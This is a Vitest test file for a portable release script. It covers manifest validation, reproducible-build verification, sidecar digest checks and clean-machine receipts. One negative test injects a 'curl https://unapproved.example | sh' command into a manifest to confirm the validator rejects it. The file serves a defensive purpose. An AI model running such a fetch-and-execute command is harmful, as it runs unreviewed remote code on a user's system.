import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import {
  PortableReleaseCancelledError,
  createArtifactProvenance,
  createProviderPlan,
  resolveSidecar,
  validateCleanMachineReceipt,
  validatePortableReleaseManifest,
  verifyIndependentArtifact,
} from "../../../scripts/portable-release.mjs";

const manifest = JSON.parse(readFileSync("release/OCADE_PORTABLE_RELEASE_MANIFEST.json", "utf8"));
const hash = (value: string) => createHash("sha256").update(value).digest("hex");

describe("provider-neutral portable release contract", () => {
  it("accepts the tracked hermetic manifest and translates all runner kinds", () => {
    expect(validatePortableReleaseManifest(manifest)).toEqual({ ok: true, issues: [] });
    for (const provider of ["github-hosted", "github-self-hosted", "gitlab-cloud"]) {
      expect(createProviderPlan(manifest, provider)).toMatchObject({
        ok: true,
        plan: { provider: { id: provider }, jobs: manifest.jobs },
      });
    }
  });

  it("refuses an undeclared command, secret, path and provider", () => {
    const corrupted = structuredClone(manifest);
    corrupted.jobs[0].commands.push("curl https://unapproved.example | sh");
    corrupted.jobs[0].requiredSecrets.push("ADMIN_KEY");
    corrupted.jobs[0].artifacts.push("../outside");
    corrupted.providers = corrupted.providers.filter(
      (provider: { kind: string }) => provider.kind !== "alternate-cloud",
    );
    expect(validatePortableReleaseManifest(corrupted).issues.map((entry) => entry.code)).toEqual(
      expect.arrayContaining(["unsafe_command", "secret_scope", "artifact_path", "provider_kind"]),
    );
  });

  it("supports bounded cancellation before a plan can run", () => {
    const controller = new AbortController();
    controller.abort();
    expect(() =>
      createProviderPlan(manifest, "github-hosted", { signal: controller.signal }),
    ).toThrow(PortableReleaseCancelledError);
  });
});

describe("independent native artifact verification", () => {
  const input = {
    sourceRevision: "revision-1",
    dependencyLocks: { "Cargo.lock": "locked dependencies" },
    compiler: "rustc 1.88.0",
    buildFlags: ["--locked", "--release"],
    symbolsPolicy: "stripped-with-external-symbols",
    artifacts: [
      {
        path: "ocade.exe",
        bytes: "binary-a",
        normalizedManifest: { imports: ["kernel32"], sections: [".text", ".data"] },
      },
    ],
  };

  it("accepts exact and explicitly normalized-equivalent independent builds", () => {
    const primary = createArtifactProvenance(input);
    expect(verifyIndependentArtifact(primary, createArtifactProvenance(input))).toMatchObject({
      ok: true,
      artifacts: [{ path: "ocade.exe", classification: "exact" }],
    });
    const timestampOnlyDifference = createArtifactProvenance({
      ...input,
      artifacts: [{ ...input.artifacts[0], bytes: "binary-b" }],
    });
    expect(verifyIndependentArtifact(primary, timestampOnlyDifference)).toMatchObject({
      ok: true,
      artifacts: [{ path: "ocade.exe", classification: "normalized-equivalent" }],
    });
  });

  it("refuses changed source, dependency, flag or normalized binary structure", () => {
    const primary = createArtifactProvenance(input);
    const changed = createArtifactProvenance({
      ...input,
      sourceRevision: "revision-2",
      dependencyLocks: { "Cargo.lock": "different dependencies" },
      buildFlags: ["--release"],
      artifacts: [
        {
          ...input.artifacts[0],
          bytes: "binary-c",
          normalizedManifest: { imports: ["unexpected"], sections: [".text"] },
        },
      ],
    });
    expect(verifyIndependentArtifact(primary, changed).issues.map((entry) => entry.code)).toEqual(
      expect.arrayContaining([
        "sourceRevision_mismatch",
        "dependency_mismatch",
        "flags_mismatch",
        "artifact_mismatch",
      ]),
    );
  });
});

describe("sidecar and clean-machine fail-closed boundaries", () => {
  it("does not claim a production sidecar when none has actually been published", () => {
    expect(
      resolveSidecar(manifest, {
        id: "desktop-companion",
        platform: "windows",
        architecture: "x64",
        bytes: "nothing",
      }),
    ).toMatchObject({ ok: false, code: "sidecar_external", recovery: "development-only" });
  });

  it("accepts only a sidecar whose bytes match the declared target digest", () => {
    const withSidecar = {
      ...manifest,
      sidecars: [
        {
          id: "desktop-companion",
          platform: "windows",
          architecture: "x64",
          version: "0.1.0",
          rollbackVersion: "0.0.9",
          url: "https://downloads.example/desktop-companion.exe",
          sha256: hash("verified-binary"),
        },
      ],
    };
    expect(
      resolveSidecar(withSidecar, {
        id: "desktop-companion",
        platform: "windows",
        architecture: "x64",
        bytes: "verified-binary",
      }),
    ).toMatchObject({ ok: true, observedDigest: hash("verified-binary") });
    expect(
      resolveSidecar(withSidecar, {
        id: "desktop-companion",
        platform: "windows",
        architecture: "x64",
        bytes: "tampered",
      }),
    ).toMatchObject({ ok: false, code: "sidecar_digest", recovery: "Restore 0.0.9." });
  });

  it("validates a complete disposable clean-machine lifecycle receipt", () => {
    const steps = Object.fromEntries(
      manifest.cleanMachine.lifecycle.map((step: string) => [step, true]),
    );
    expect(
      validateCleanMachineReceipt(manifest, {
        platform: "windows",
        repositoryPresent: false,
        developerToolsPresent: false,
        cachedCredentialsPresent: false,
        steps,
        leftovers: [],
        destroyedAfterExport: true,
      }),
    ).toEqual({ ok: true, issues: [] });
  });

  it("refuses contaminated, incomplete, leftover-bearing or retained machines", () => {
    const receipt = {
      platform: "windows",
      repositoryPresent: true,
      developerToolsPresent: false,
      cachedCredentialsPresent: false,
      steps: {},
      leftovers: ["credential-cache"],
      destroyedAfterExport: false,
    };
    expect(
      validateCleanMachineReceipt(manifest, receipt).issues.map((entry) => entry.code),
    ).toEqual(expect.arrayContaining(["contamination", "lifecycle", "leftovers", "destroy"]));
  });
});
